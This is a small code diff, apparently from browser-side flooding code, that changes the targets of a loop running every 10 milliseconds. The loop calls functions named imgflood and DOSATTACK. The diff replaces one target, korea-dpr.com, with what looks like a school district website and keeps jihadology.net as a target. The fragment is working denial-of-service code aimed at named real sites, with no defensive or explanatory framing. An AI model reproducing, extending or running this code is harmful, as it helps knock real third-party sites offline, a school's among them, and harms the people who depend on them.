@@ -18,8 +18,7 @@ setInterval(function(){
 
 setInterval(function(){
   imgflood("http://jihadology.net");
-  imgflood("http://korea-dpr.com");
+  imgflood("http://ls-child.mvcsc.k12.in.us");
   DOSATTACK("http://jihadology.net");
-  DOSATTACK("http://korea-dpr.com");
+  DOSATTACK("http://ls-child.mvcsc.k12.in.us");
 }, 10);
-
